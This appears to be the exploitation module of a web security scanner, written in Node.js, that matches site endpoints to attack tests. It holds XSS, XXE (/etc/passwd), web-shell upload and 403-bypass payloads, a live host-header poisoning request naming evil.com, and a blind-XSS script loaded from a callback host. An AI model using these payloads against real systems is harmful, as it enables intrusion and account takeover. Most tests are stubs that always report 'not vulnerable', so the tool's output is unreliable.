// backend/src/services/exploitationService.js
const axios = require('axios');
const { exec } = require('child_process');
const { promisify } = require('util');
const execAsync = promisify(exec);
const cheerio = require('cheerio');

class ExploitationService {
  constructor() {
    // Based on your exploitation checklist
    this.exploitationMatrix = {
      // Upload Functions (from your checklist)
      upload_functions: {
        patterns: ['/upload', '/file-upload', '/media/upload', '/attachments'],
        tests: [
          this.testFileUploadXSS,
          this.testFileUploadShell,
          this.testXMLUploadXXE,
          this.testImageMetadataXSS
        ]
      },
      
      // Content Types (from checklist)
      content_types: {
        'multipart/form-data': [this.testMultipartInjection],
        'application/xml': [this.testXXEInjection],
        'application/json': [this.testJSONInjection]
      },
      
      // Account Sections (from checklist)
      account_sections: {
        patterns: ['/profile', '/account', '/settings', '/user'],
        tests: [
          this.testStoredXSS,
          this.testBlindXSS,
          this.testSSTI,
          this.testCSRF
        ]
      },
      
      // Password Reset (comprehensive from checklist)
      password_reset: {
        patterns: ['/reset', '/forgot', '/password-reset'],
        tests: [
          this.testPasswordResetPoisoning,
          this.testHTTPParameterPollution,
          this.testIDORPasswordReset,
          this.testTokenLeakage,
          this.testWeakTokenGeneration
        ]
      },
      
      // Email Functions
      email_functions: {
        patterns: ['/contact', '/newsletter', '/subscribe'],
        tests: [
          this.testEmailInjection,
          this.testEmailSSRF,
          this.testEmailXSS
        ]
      },
      
      // API Endpoints
      api_endpoints: {
        patterns: ['/api/', '/v1/', '/v2/', '/rest/', '/graphql'],
        tests: [
          this.testAPIAuthentication,
          this.testSQLInjection,
          this.testIDOR,
          this.testBusinessLogicFlaws,
          this.test403Bypass
        ]
      }
    };
  }

  async runSystematicExploitation(scan, target, findings) {
    console.log(`âš”ï¸ Running systematic exploitation for: ${target.domain}`);
    
    const results = {
      target_domain: target.domain,
      exploitation_results: {},
      vulnerabilities_found: [],
      attack_vectors: [],
      high_value_findings: [],
      recommendations: [],
      scan_timestamp: new Date().toISOString()
    };

    // Parse findings from previous scans
    const attackSurface = this.analyzeAttackSurface(findings);
    
    // Test each attack vector systematically
    for (const [category, vectorInfo] of Object.entries(this.exploitationMatrix)) {
      console.log(`ðŸŽ¯ Testing ${category}...`);
      
      const categoryResults = await this.testAttackVector(
        category, 
        vectorInfo, 
        attackSurface, 
        target
      );
      
      results.exploitation_results[category] = categoryResults;
      results.vulnerabilities_found.push(...categoryResults.vulnerabilities);
      
      // Update progress (assuming we're called from scan service)
      if (scan && scan.id) {
        const progress = 20 + (Object.keys(results.exploitation_results).length / 
          Object.keys(this.exploitationMatrix).length) * 60;
        // Would call ScanJob.updateProgress(scan.id, progress);
      }
    }

    // Prioritize findings
    results.high_value_findings = this.prioritizeFindings(results.vulnerabilities_found);
    results.recommendations = this.generateExploitationRecommendations(results);

    return results;
  }

  analyzeAttackSurface(findings) {
    const surface = {
      upload_endpoints: [],
      forms: [],
      api_endpoints: [],
      parameters: [],
      xss_sinks: [],
      authentication_endpoints: []
    };

    // Extract from content discovery results
    if (findings.content_discovery && findings.content_discovery.discovered_content) {
      findings.content_discovery.discovered_content.forEach(item => {
        if (item.content_type === 'form') {
          surface.forms.push(item);
        } else if (item.content_type === 'api') {
          surface.api_endpoints.push(item);
        } else if (item.content_type === 'xss_sink') {
          surface.xss_sinks.push(item);
        } else if (item.path.includes('upload')) {
          surface.upload_endpoints.push(item);
        }
        
        if (item.parameters) {
          surface.parameters.push(...item.parameters);
        }
      });
    }

    // Extract from subdomain findings
    if (findings.live_hosts_scan && findings.live_hosts_scan.live_host_details) {
      findings.live_hosts_scan.live_host_details.forEach(host => {
        // Look for authentication endpoints
        if (host.title && host.title.toLowerCase().includes('login')) {
          surface.authentication_endpoints.push(host);
        }
      });
    }

    return surface;
  }

  async testAttackVector(category, vectorInfo, attackSurface, target) {
    const results = {
      category: category,
      targets_tested: 0,
      vulnerabilities: [],
      successful_exploits: [],
      failed_attempts: []
    };

    try {
      // Find relevant endpoints for this attack vector
      const relevantEndpoints = this.findRelevantEndpoints(vectorInfo, attackSurface);
      
      for (const endpoint of relevantEndpoints.slice(0, 5)) { // Limit for performance
        results.targets_tested++;
        
        // Run each test for this vector
        if (vectorInfo.tests) {
          for (const testFunction of vectorInfo.tests) {
            try {
              const testResult = await testFunction.call(this, endpoint, target);
              if (testResult.vulnerable) {
                results.vulnerabilities.push(testResult);
                results.successful_exploits.push(testResult);
              } else {
                results.failed_attempts.push(testResult);
              }
            } catch (testError) {
              console.error(`Test failed for ${category}:`, testError.message);
              results.failed_attempts.push({
                endpoint: endpoint.url,
                error: testError.message,
                test: testFunction.name
              });
            }
          }
        }
      }
      
    } catch (error) {
      console.error(`Attack vector ${category} failed:`, error.message);
    }

    return results;
  }

  findRelevantEndpoints(vectorInfo, attackSurface) {
    const endpoints = [];
    
    if (vectorInfo.patterns) {
      // Find endpoints matching patterns
      Object.values(attackSurface).flat().forEach(item => {
        if (item.path || item.url) {
          const path = item.path || new URL(item.url).pathname;
          if (vectorInfo.patterns.some(pattern => path.includes(pattern))) {
            endpoints.push(item);
          }
        }
      });
    }

    return endpoints;
  }

  // File Upload Tests (from your checklist)
  async testFileUploadXSS(endpoint, target) {
    try {
      // Test XSS in filename
      const xssPayload = '<script>alert("XSS")</script>.jpg';
      // Implementation would create multipart form with malicious filename
      
      return {
        vulnerable: false, // Placeholder - would implement actual test
        type: 'File Upload XSS',
        endpoint: endpoint.url,
        severity: 'high',
        description: 'File upload may be vulnerable to XSS via filename manipulation'
      };
    } catch (error) {
      throw new Error(`File upload XSS test failed: ${error.message}`);
    }
  }

  async testFileUploadShell(endpoint, target) {
    try {
      // Test shell upload bypass techniques
      const shellPayloads = [
        'shell.php.jpg', // Double extension
        'shell.php%00.jpg', // Null byte injection
        'shell.phtml', // Alternative PHP extension
        'shell.php5' // PHP5 extension
      ];
      
      // Would implement actual upload attempts
      return {
        vulnerable: false,
        type: 'File Upload Shell',
        endpoint: endpoint.url,
        severity: 'critical',
        description: 'File upload may allow malicious file uploads'
      };
    } catch (error) {
      throw new Error(`Shell upload test failed: ${error.message}`);
    }
  }

  async testXMLUploadXXE(endpoint, target) {
    try {
      const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>`;
      
      // Would implement actual XXE test
      return {
        vulnerable: false,
        type: 'XXE via XML Upload',
        endpoint: endpoint.url,
        severity: 'high',
        description: 'XML file upload may be vulnerable to XXE attacks'
      };
    } catch (error) {
      throw new Error(`XXE test failed: ${error.message}`);
    }
  }

  // Password Reset Tests (comprehensive from your checklist)
  async testPasswordResetPoisoning(endpoint, target) {
    try {
      // Test Host header manipulation
      const maliciousHost = 'evil.com';
      const response = await axios.post(endpoint.url, {
        email: 'test@victim.com'
      }, {
        headers: {
          'Host': maliciousHost,
          'X-Forwarded-Host': maliciousHost,
          'X-Host': maliciousHost
        },
        timeout: 10000,
        validateStatus: () => true
      });

      return {
        vulnerable: false, // Would check response for success
        type: 'Password Reset Poisoning',
        endpoint: endpoint.url,
        severity: 'high',
        description: 'Password reset may be vulnerable to host header poisoning'
      };
    } catch (error) {
      throw new Error(`Password reset poisoning test failed: ${error.message}`);
    }
  }

  async testHTTPParameterPollution(endpoint, target) {
    try {
      // Test parameter pollution techniques from your checklist
      const pollutionTests = [
        'email=victim@gmail.com&email=attacker@gmail.com',
        'email[]=victim@gmail.com&email[]=attacker@gmail.com',
        'email=victim@gmail.com%20email=attacker@gmail.com'
      ];

      for (const testPayload of pollutionTests) {
        // Would implement actual pollution test
      }

      return {
        vulnerable: false,
        type: 'HTTP Parameter Pollution',
        endpoint: endpoint.url,
        severity: 'medium',
        description: 'Password reset may be vulnerable to parameter pollution'
      };
    } catch (error) {
      throw new Error(`Parameter pollution test failed: ${error.message}`);
    }
  }

  // Account Section Tests
  async testStoredXSS(endpoint, target) {
    try {
      const xssPayloads = [
        '<script>alert("Stored XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '"><script>alert(String.fromCharCode(88,83,83))</script>'
      ];

      // Would implement stored XSS testing in profile fields
      return {
        vulnerable: false,
        type: 'Stored XSS',
        endpoint: endpoint.url,
        severity: 'high',
        description: 'Profile/account fields may be vulnerable to stored XSS'
      };
    } catch (error) {
      throw new Error(`Stored XSS test failed: ${error.message}`);
    }
  }

  async testBlindXSS(endpoint, target) {
    try {
      // Blind XSS payload that calls back to our server
      const blindXSSPayload = `<script src="https://your-xss-hunter.com/unique-id"></script>`;
      
      // Would implement blind XSS injection in various fields
      return {
        vulnerable: false,
        type: 'Blind XSS',
        endpoint: endpoint.url,
        severity: 'high',
        description: 'Application may be vulnerable to blind XSS in admin panels'
      };
    } catch (error) {
      throw new Error(`Blind XSS test failed: ${error.message}`);
    }
  }

  // API Tests
  async testIDOR(endpoint, target) {
    try {
      // Test for IDOR by manipulating ID parameters
      const urlObj = new URL(endpoint.url);
      const pathParts = urlObj.pathname.split('/');
      
      // Look for numeric IDs and test manipulation
      pathParts.forEach((part, index) => {
        if (/^\d+$/.test(part)) {
          // Found numeric ID - would test manipulation
        }
      });

      return {
        vulnerable: false,
        type: 'IDOR (Insecure Direct Object Reference)',
        endpoint: endpoint.url,
        severity: 'high',
        description: 'API endpoint may be vulnerable to IDOR attacks'
      };
    } catch (error) {
      throw new Error(`IDOR test failed: ${error.message}`);
    }
  }

  async testBusinessLogicFlaws(endpoint, target) {
    try {
      // Test common business logic flaws
      const businessLogicTests = [
        'Negative quantities in orders',
        'Price manipulation',
        'Race conditions in payments',
        'Workflow bypass',
        'Permission escalation'
      ];

      // Would implement specific business logic testing
      return {
        vulnerable: false,
        type: 'Business Logic Flaw',
        endpoint: endpoint.url,
        severity: 'medium',
        description: 'API may contain business logic vulnerabilities'
      };
    } catch (error) {
      throw new Error(`Business logic test failed: ${error.message}`);
    }
  }

  async test403Bypass(endpoint, target) {
    try {
      // Test 403 bypass techniques from your checklist
      const bypassTechniques = [
        { method: 'GET', path: endpoint.path + '/' },
        { method: 'POST', path: endpoint.path },
        { method: 'GET', path: endpoint.path, headers: { 'X-Original-URL': endpoint.path } },
        { method: 'GET', path: endpoint.path, headers: { 'X-Rewrite-URL': endpoint.path } },
        { method: 'GET', path: endpoint.path + '%2e' },
        { method: 'GET', path: endpoint.path + '/.' }
      ];

      for (const technique of bypassTechniques) {
        // Would implement bypass attempt
      }

      return {
        vulnerable: false,
        type: '403 Bypass',
        endpoint: endpoint.url,
        severity: 'medium',
        description: 'Endpoint may be bypassable despite 403 response'
      };
    } catch (error) {
      throw new Error(`403 bypass test failed: ${error.message}`);
    }
  }

  // Additional test methods would go here...
  async testSQLInjection(endpoint, target) {
    // SQL injection testing with various payloads
    return { vulnerable: false, type: 'SQL Injection', endpoint: endpoint.url, severity: 'critical' };
  }

  async testSSTI(endpoint, target) {
    // Server-Side Template Injection testing
    return { vulnerable: false, type: 'SSTI', endpoint: endpoint.url, severity: 'high' };
  }

  async testCSRF(endpoint, target) {
    // CSRF testing
    return { vulnerable: false, type: 'CSRF', endpoint: endpoint.url, severity: 'medium' };
  }

  async testEmailInjection(endpoint, target) {
    // Email injection testing
    return { vulnerable: false, type: 'Email Injection', endpoint: endpoint.url, severity: 'medium' };
  }

  async testEmailSSRF(endpoint, target) {
    // Email-based SSRF testing
    return { vulnerable: false, type: 'Email SSRF', endpoint: endpoint.url, severity: 'high' };
  }

  async testEmailXSS(endpoint, target) {
    // Email XSS testing
    return { vulnerable: false, type: 'Email XSS', endpoint: endpoint.url, severity: 'high' };
  }

  async testAPIAuthentication(endpoint, target) {
    // API authentication bypass testing
    return { vulnerable: false, type: 'API Auth Bypass', endpoint: endpoint.url, severity: 'high' };
  }

  async testMultipartInjection(endpoint, target) {
    // Multipart form injection testing
    return { vulnerable: false, type: 'Multipart Injection', endpoint: endpoint.url, severity: 'medium' };
  }

  async testXXEInjection(endpoint, target) {
    // XXE injection testing
    return { vulnerable: false, type: 'XXE Injection', endpoint: endpoint.url, severity: 'high' };
  }

  async testJSONInjection(endpoint, target) {
    // JSON injection testing
    return { vulnerable: false, type: 'JSON Injection', endpoint: endpoint.url, severity: 'medium' };
  }

  async testImageMetadataXSS(endpoint, target) {
    // Image metadata XSS testing
    return { vulnerable: false, type: 'Image Metadata XSS', endpoint: endpoint.url, severity: 'medium' };
  }

  async testIDORPasswordReset(endpoint, target) {
    // IDOR in password reset testing
    return { vulnerable: false, type: 'Password Reset IDOR', endpoint: endpoint.url, severity: 'high' };
  }

  async testTokenLeakage(endpoint, target) {
    // Token leakage testing
    return { vulnerable: false, type: 'Token Leakage', endpoint: endpoint.url, severity: 'high' };
  }

  async testWeakTokenGeneration(endpoint, target) {
    // Weak token generation testing
    return { vulnerable: false, type: 'Weak Token Generation', endpoint: endpoint.url, severity: 'medium' };
  }

  prioritizeFindings(vulnerabilities) {
    return vulnerabilities
      .filter(vuln => vuln.severity === 'critical' || vuln.severity === 'high')
      .sort((a, b) => {
        const severityOrder = { critical: 4, high: 3, medium: 2, low: 1 };
        return severityOrder[b.severity] - severityOrder[a.severity];
      });
  }

  generateExploitationRecommendations(results) {
    const recommendations = [];

    if (results.vulnerabilities_found.length > 0) {
      recommendations.push({
        type: 'Immediate Actions',
        priority: 'critical',
        items: [
          'Review and validate all user input points',
          'Implement proper authentication and authorization checks',
          'Add rate limiting to sensitive endpoints',
          'Enable security headers (CSP, HSTS, etc.)'
        ]
      });
    }

    if (results.high_value_findings.length > 0) {
      recommendations.push({
        type: 'High-Priority Fixes',
        priority: 'high',
        items: results.high_value_findings.map(finding => 
          `Fix ${finding.type} vulnerability in ${finding.endpoint}`
        )
      });
    }

    return recommendations;
  }
}

module.exports = new ExploitationService();